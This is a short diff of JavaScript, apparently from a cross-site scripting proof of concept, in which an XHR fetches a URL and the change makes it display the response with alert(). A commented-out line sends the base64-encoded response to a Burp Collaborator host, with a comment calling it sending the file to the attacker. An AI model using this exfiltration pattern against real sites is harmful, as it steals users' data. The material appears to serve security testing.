@@ -6,7 +6,7 @@
             if (xhr.readyState === 4) {
                 // fetch('https://||.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); 
                 //send b64 encoded file to attacker
-                window.load(xhr.responseText)
+                window.alert(xhr.responseText)
             }
         }
         xhr.open('GET', url, true);
